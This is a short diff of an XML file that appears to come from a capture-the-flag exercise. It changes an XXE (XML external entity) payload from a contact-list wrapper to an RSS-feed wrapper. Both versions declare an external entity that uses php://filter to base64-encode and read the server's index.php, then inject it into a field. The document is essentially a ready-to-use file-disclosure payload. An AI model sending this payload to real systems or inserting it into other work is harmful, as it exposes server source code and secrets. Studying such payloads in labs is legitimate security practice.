@@ -1,11 +1,15 @@
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
-<contacts>
-  <contact>
-    <name>Jean &xxe; Dupont</name>
-    <phone>00 11 22 33 44</phone>
-    <address>42 rue du CTF</address>
-    <zipcode>75000</zipcode>
-    <city>Paris</city>
-  </contact>
-</contacts>
+<rss version="2.0">
 
+<channel>
+  <title>&xxe;</title>
+  <link>https://www.w3schools.com</link>
+  <description>Free web building tutorials</description>
+  <item>
+    <title>RSS Tutorial</title>
+    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
+    <description>New RSS tutorial on W3Schools</description>
+  </item>
+</channel>
+
+</rss>
